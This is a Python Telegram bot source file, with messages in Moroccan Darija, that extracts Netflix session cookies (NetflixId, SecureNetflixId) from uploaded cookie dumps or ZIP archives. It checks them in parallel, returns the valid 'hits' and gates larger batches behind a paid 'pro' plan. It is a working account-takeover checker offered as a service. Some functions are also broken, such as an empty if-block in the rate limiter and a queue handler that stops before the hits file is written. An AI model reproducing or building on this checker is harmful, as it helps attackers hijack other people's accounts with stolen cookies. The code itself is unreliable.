def get_rate_limit_token():
    global rate_limit_tokens, rate_limit_last_reset
    with rate_limit_lock:
        now = time.time()
        if now - rate_limit_last_reset >= 1:

        return False

def parse_duration(arg):
    arg = arg.strip().lower()
    if arg.endswith('m'):
        mins = float(arg[:-1])
        return int(mins * 60), f"{int(mins)} min"
    elif arg.endswith('h'):
        hrs = float(arg[:-1])
        return int(hrs * 3600), f"{hrs:.4g}h"
    else:
        hrs = float(arg)
        return int(hrs * 3600), f"{hrs:.4g}h"

def extract_cookies_from_text(text):
    cookies = []
    current = None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            try:
                value = urllib.parse.unquote(value)
            except:
                pass
            if name == 'NetflixId':
                if current:
                    cookies.append(current)
                current = {'NetflixId': value, 'SecureNetflixId': None}
            elif name == 'SecureNetflixId' and current:
                current['SecureNetflixId'] = value
    if current:
        cookies.append(current)
    if not cookies and 'NetflixId=' in text:
        for m in re.finditer(r'NetflixId=([A-Za-z0-9%&=_-]+)', text):
            v = m.group(1)
            try:
                v = urllib.parse.unquote(v)
            except:
                pass
            cookies.append({'NetflixId': v, 'SecureNetflixId': None})
    return cookies

def process_queue():
    while True:
        try:
            task = task_queue.get()
            if task is None:
                break

            user_id, chat_id, cookies, message_id = task
            total_cookies = len(cookies)
            found = [0]
            checked = [0]
            all_hits = []
            hits_lock = Lock()
            last_edit = [time.time()]

            def update_progress():
                now = time.time()
                if now - last_edit[0] >= 1.5:
                    try:
                        bot.edit_message_text(
                            f"🔄 Progress: {checked[0]}/{total_cookies} | ✅ Valid: {found[0]}",
                            chat_id, message_id
                        )
                        last_edit[0] = now
                    except:
                        pass

            def check_and_collect(cookie):
                result = check_single_cookie(cookie)
                checked[0] += 1
                if result:
                    found[0] += 1
                    save_hit(user_id, result)
                    with hits_lock:
                        all_hits.append(result)
                update_progress()
                return result

            with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, total_cookies)) as executor:
                futures = [executor.submit(check_and_collect, cookie) for cookie in cookies]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except:
                        pass

            increment_check(user_id)

            with active_lock:
                if user_id in active_users:
                    del active_users[user_id]

            try:
                bot.edit_message_text(
                    f"✅ Salina! {found[0]}/{total_cookies} mzyanin.\nSifft l-file dyal hits...",
                    chat_id, message_id
                )
            except:
                pass

            if all_hits:
                with check_counter_lock:
                    check_counter[0] += 1
                    c_num = check_counter[0]

                filename = f"hits_check_{c_num}.txt"

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.chat.id

    if user_state.get(user_id) != "awaiting_netflix_file":
        bot.reply_to(message, "⚠️ Sir l /start → Select Checker → Netflix w 3ad sift l-file.")
        return

    with rate_lock:
        now = time.time()
        last = user_last_check.get(user_id, 0)
        if now - last < 3:
            wait = int(3 - (now - last))
            bot.reply_to(message, f"⏳ Tsna {wait} saniyat 9bl ma tsifft tani.")
            return
        user_last_check[user_id] = now

    allowed, msg = can_check(user_id)
    if not allowed:
        bot.reply_to(message, msg, parse_mode="Markdown")
        return

    with active_lock:
        if user_id in active_users:
            bot.reply_to(message, "⏳ L-check l-9dim dyalk mazal خدام.")
            return
        active_users[user_id] = True

    try:
        file_info = bot.get_file(message.document.file_id)
        data = bot.download_file(file_info.file_path)
        filename = message.document.file_name
        is_zip = filename.lower().endswith('.zip')

        if is_zip:
            user = get_user(user_id)
            if user["plan"] != "pro":
                with zipfile.ZipFile(BytesIO(data)) as z:
                    txt_count = sum(1 for n in z.namelist() if n.endswith('.txt'))
                if txt_count > FREE_MAX_FILES_PER_ZIP:
                    with active_lock:
                        del active_users[user_id]
                    bot.reply_to(message, f"❌ Free plan: max {FREE_MAX_FILES_PER_ZIP} .txt files f ZIP.\n💎 Upgrade: {OWNER_USERNAME}")
                    return
            cookies = []
            with zipfile.ZipFile(BytesIO(data)) as z:
                for name in z.namelist():
                    if name.endswith('.txt'):
                        content = z.read(name).decode('utf-8', errors='ignore')
                        cookies.extend(extract_cookies_from_text(content))
        else:
            content = data.decode('utf-8', errors='ignore')
            cookies = extract_cookies_from_text(content)

        if not cookies:
            with active_lock:
                del active_users[user_id]
            bot.reply_to(message, "❌ Ma l9ina ta chi cookie valid f had l-file.")
            return

        max_cookies = get_max_cookies(user_id)
        if len(cookies) > max_cookies:
            with active_lock:
                del active_users[user_id]
            bot.reply_to(message, f"❌ **Limit!**\nMax {max_cookies} cookies/check.\nNsifti {len(cookies)}.\n💎 Upgrade: {OWNER_USERNAME}", parse_mode="Markdown")
            return

        user_state.pop(user_id, None)
        status_msg = bot.reply_to(message, f"🔄 Kancheckiw {len(cookies)} cookies...\n✅ Hits: 0")
        task_queue.put((user_id, message.chat.id, cookies, status_msg.message_id))

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        with active_lock:
            if user_id in active_users:
                del active_users[user_id]
